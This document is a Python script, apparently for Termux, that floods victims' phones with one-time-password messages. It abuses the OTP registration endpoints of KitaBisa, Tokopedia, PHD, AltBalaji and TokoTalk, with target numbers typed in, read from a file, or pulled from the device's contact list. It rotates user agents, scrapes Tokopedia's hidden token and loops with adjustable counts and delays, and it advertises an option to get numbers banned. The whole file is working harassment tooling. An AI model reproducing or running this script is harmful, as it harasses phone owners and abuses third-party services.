#!/usr/bin/python
import requests,random,json,time,sys,os,re
# -----------------------------------------------------------
# created By ./Carlos 121
# Update 14 Juny 2021 10:57
# Thanks FoR FourX, MhankBarBar, Maulana, ITachI
# Underground Science And Termux Tutorial Group
# ---------------------------------------------------------------

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------
# Sebuah Program Python Yg Menggunakan Program Berorientasi Object
#------------------------Classes------------------------
class spam:
		
	def __init__(self, nomer):
		self.nomer = nomer
		
	def spam(self):
		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
		if hasil.status_code == 200:
			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSuccess!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
			
	def tokped(self):
		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
		kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mspam enviado {self.nomer} \x1b[91merro!'
		else:
			return f'\x1b[92mspam enviado {self.nomer} {h}sucesso!'

	def phd(self):
		param = {'phone_number':self.nomer}
		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
		else:
			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
			
	def balaji(self):
		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		kod="62"
		ata={
				"country_code":kod,
				"phone_number":self.nomer
			}
		head={
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
			}
		req=requests.post(urlb,data=json.dumps(ata),headers=head)
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {m}Fail!'
	def TokoTalk(self):
		data='{"key":"phone","value":"'+str(self.nomer)+'"}'
		head={
			"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
			"content-type":"application/json;charset=UTF-8"
		}
		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
			return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpamm TokoTalk {self.nomer} {m}Fail!'
# ------------------------------------------------------------

# ---------------------------Fungsi----------------------------
def apakah():
	while True:
		lan=str(input(k+'\tmais spam? (y)sim/(n)não : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
			break
		else:
			continue
def files():
	fil=str(input(k+'\tfila : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\ttotal de spam : '+h))
		dly=int(input(k+'\tdelay : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'ktbs':
					print('\t'+z.spam().__str__())
				elif jns == 'tkpd':
					print('\t'+z.tokped().__str__())
				elif jns == 'blji':
					print('\t'+z.balaji().__str__())
				elif jns == 'smua':
					print('\t'+z.spam().__str__())
					print('\t'+z.tokped().__str__())
					print('\t'+z.balaji().__str__())
					print('\t'+z.phd().__str__())
					print('\t'+z.TokoTalk().__str__())
				elif jns == 'pehd':
					print('\t'+z.phd().__str__())
				elif jns == 'ttk':
					print('\t'+z.TokoTalk().__str__())
				else:
					print()
				time.sleep(dly)
		apakah()
	else:
		print(m+f'\tessa filha {fil} não existe!')
def single():
	nomer=str(input(k+'\tqual número? : '+h))
	jm=int(input(k+'\ttotal de spam : '+h))
	dly=int(input(k+'\tdelay : '+h))
	for oo in range(jm):
		z=spam(nomer)
		if jns == 'ktbs':
			print('\t'+z.spam().__str__())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam().__str__())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		else:
			print()
		time.sleep(dly)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\ttotal de números : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tnúmero -{i+1} : '+h)))
	spm=int(input(k+'\ttotal de spam : '+h))
	dly=int(input(k+'delay : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(nomer[ss])
			if jns == 'ktbs':
				print('\t'+z.spam().__str__())
			elif jns == 'tkpd':
				print('\t'+z.tokped())
			elif jns == 'blji':
				print('\t'+z.balaji())
			elif jns == 'smua':
				print('\t'+z.spam().__str__())
				print('\t'+z.tokped())
				print('\t'+z.balaji())
				print('\t'+z.phd())
				print('\t'+z.TokoTalk())
			elif jns == 'pehd':
				print('\t'+z.phd())
			elif jns == 'ttk':
				print('\t'+z.TokoTalk())
			else:
				print()
		time.sleep(dly)
	apakah()
#-------------------------Fungsi Banner-----------------------
def logo():
	os.system('clear')
	auth=m+' 𝝅 criador : '+k+'Carlos 121'
	# jika ingin m3namambah kan variabel dan mengubah data variabel kitsune bisa menambahkan %s menambahkan variabel terus di ubah menjjadu string, %d = mengubah data menjadi decimal , %i = mengubah data menjadi integer
	return '''
%s╭━┳━╭━╭━╮%s╮╲╲╲╲╲╲%s _
%s┃┈┈┈┣☯︎╋☯︎┫┃%s╲╲╲╲╲╲%s/ |
%s┃┈┃┈╰━╰━━━━━━╮%s╲╲%s| | ____
%s╰┳╯┈┈┈┈┈┈┈┈┈◢▉◣%s %s| ||___ ╲
%s╲┃┈┈┈┈┈┈┈┈┈┈▉▉▉%s %s|_|  __) | _
%s╲┃┈┈┈┈┈┈┈┈┈┈◥▉◤%s %s    / __/ / |
%s╲┃┈┈┈┈╭━┳━━━━╯%s╲╲%s   |_____|| |
%s╲┣━━━━━━┫%s╲╲╲╲╲╲╲%s          | |
%s╲┃┈┈┈┈┈┈┃%s╲╲╲╲╲╲╲%s          |_|
%s''' % (k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,auth)
# -----------------------------------------------------------
def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tchoose > '+h))-1]['number']
	dly=int(input(u+'\tdelay > '+h))
	for w in range(int(input(u+'\ttotal de spam : '+h))):
		z=spam(nj)
		if jns == 'ktbs':
			print('\t'+z.spam().__str__())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam().__str__())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		time.sleep(dly)
	apakah()
def main():
	print(logo())
	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'opções abaixo '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'x'+m+'』'+bm+' voltar\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'cadê o número\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'vários números\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'pegue da fila\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'pegue nos seus contatos\n'+b+'╠══════════════════════════════')
	pil=str(input(b+'╚══'+m+'〙'+u+'opção'+m+' ▶ '+h))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		multi()
	elif( pil == '3' or pil == '03'):
		files()
	elif( pil == '4' or pil == '04'):
		termux()
	elif( pil == 'x' or pil == 'xx'):
		jnspam()
	else:
		print(m+'             não deixe em branco!')
		time.sleep(2)
		main()
def jnspam():
	global jns
	print(logo())
	print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'@userby121 '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'0'+m+'』'+bm+' sair\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'All\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'banir números 100%\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk (Unlimited)\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji (Without +62 or 0)\n'+b+'╠══════════════════════════════')
	while True:
		oy=str(input(b+'╚══'+m+'〙'+u+'opção'+m+' ▶ '+h))
		if( oy == '1' or oy == '01' ):
			jns='smua'
			break
		elif( oy == '2' or oy == '02' ):
			jns='pehd'
			break
		elif( oy == '3' or oy == '03' ):
			jns='ktbs'
			break
		elif( oy == '4' or oy == '04' ):
			jns='tkpd'
			break
		elif( oy == '5' or oy == '05' ):
			jns='ttk'
			break
		elif( oy == '6' or oy == '06' ):
			jns='blji'
			break
		elif( oy == '0' or oy == '00' ):
			sys.exit()
		else:
			print(m+'             não deixe em branco!')
			continue
	main()
if __name__ == '__main__':
	jnspam()
